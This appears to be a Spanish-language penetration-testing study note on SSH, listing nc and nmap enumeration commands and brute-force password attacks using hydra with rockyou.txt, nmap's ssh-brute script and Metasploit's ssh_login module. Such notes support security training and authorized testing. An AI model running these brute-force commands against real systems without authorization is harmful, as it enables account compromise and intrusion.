

```bash 
#Nos da el Baner del protocolo , se utiliza para la enumeracion
nc 10.10.2.3 22

#Nos da los algoritmos que podemos utilizar para generar las llaves rsa
nmap ip -p 22 --script ssh2-enum-algos

#Para obtener la clave publica del servidor
nmap ip -p 22 --script ssh-hostkey --script-args ssh_hostkey=full 

#Revisar password debiles
nmap ip -p 22 --script ssh-auth-methods --script-args="ssh.user=student" 

nmap ip -p 22 --script ssh-auth-methods --script-args="ssh.user=admin"
```

#### Fuerza Bruta con hydra
```bash
hydra -L student -P /usr/share/wordlists/rockyou.txt  ip ssh
```

#### Fuerza Bruta con NMAP
```bash
nmap ip -p 22 --script ssh-brute --script-args userdb=/root/user

userdb -> Se le asigna un archivo que contiene el numbre del usuario

nano user
administrator
```

#### Fuerza Bruta con mfsconsole

```bash

mfsconsole
>use auxiliary/scanner/ssh/ssh_login
>show
>set rhost ip
>set userpass_file /usr/share/metasploit/root_userpass.txt
>set STOP_ON_SUCCESS true
>set verbose true
>options  # Muestra las opciones establecidas
>run
```
